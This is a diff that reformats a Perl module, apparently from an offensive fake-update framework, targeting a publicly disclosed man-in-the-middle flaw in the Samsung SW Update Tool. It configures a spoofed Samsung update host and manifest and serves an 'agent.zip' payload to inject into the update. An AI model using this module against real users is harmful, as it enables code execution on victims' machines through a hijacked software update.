@@ -25,55 +25,51 @@ package modules::samsung;
 use strict;
 use Data::Dump qw(dump);
 
-my $base=
-{
+my $base = {
 
-
-    'name' => 'samsung',
-    'version' => '1.0',
-    'appver' => ' <= Samsung SW Update Tool 2.2.5.16',
-    'author' => [ 'Francisco Amato <famato +[AT]+ infobytesec.com' ],
+    'name'        => 'samsung',
+    'version'     => '1.0',
+    'appver'      => ' <= Samsung SW Update Tool 2.2.5.16',
+    'author'      => ['Francisco Amato <famato +[AT]+ infobytesec.com'],
     'description' => qq{Found By:  Joaquín Rodríguez Varela
-                        The Samsung SW Update Tool [1] is a tool that analyzes the system drivers of a computer. You can install relevant software for your computer easier and faster using SW Update. 
-                        The SW Update program helps you install and update your software and driver easily. Samsung [2] SW Update Tool is prone to a Men in The Middle attack which could result in 
+                        The Samsung SW Update Tool [1] is a tool that analyzes the system drivers of a computer. You can install relevant software for your computer easier and faster using SW Update.
+                        The SW Update program helps you install and update your software and driver easily. Samsung [2] SW Update Tool is prone to a Men in The Middle attack which could result in
                         integrity corruption of the transferred data, information leak and consequently code execution.
                         https://www.coresecurity.com/advisories/samsung-sw-update-tool-mitm},
-                        
-    'vh' => '(orcaservice.samsungmobile.com)',
+
+    'vh'      => '(orcaservice.samsungmobile.com)',
     'request' => [
-		    {
-		        'req' => 'dl/bom/MAX6356A04.XML',
-		        'type' => 'file',
-		        'method' => '',
-		        'bin'    => '0',
-		        'string' => '',
-		        'parse' => '1',
-		        'file' => './include/samsung/general.xml',
-		    },
-		    {
-		        'req' => '.zip',
-		        'type' => 'agent',
-		        'method' => '',
-		        'bin'    => 1,		    
-		        'string' => '',
-		        'parse' => '0',
-		        'file' => ''
-		    },
+        {   'req'    => 'dl/bom/MAX6356A04.XML',
+            'type'   => 'file',
+            'method' => '',
+            'bin'    => '0',
+            'string' => '',
+            'parse'  => '1',
+            'file'   => './include/samsung/general.xml',
+        },
+        {   'req'    => '.zip',
+            'type'   => 'agent',
+            'method' => '',
+            'bin'    => 1,
+            'string' => '',
+            'parse'  => '0',
+            'file'   => ''
+        },
     ],
-    #Options		    
+
+    #Options
     'options' => {
         'agent' => {
-            'val' => './agent/agent.zip',
+            'val'  => './agent/agent.zip',
             'desc' => 'Agent to inject',
         },
-		'enable' => {
-            'val' => 1, 
+        'enable' => {
+            'val'  => 1,
             'desc' => 'Status'
         },
 
     }
 };
-
 
 ##########################################################################
 # FUNCTION      new
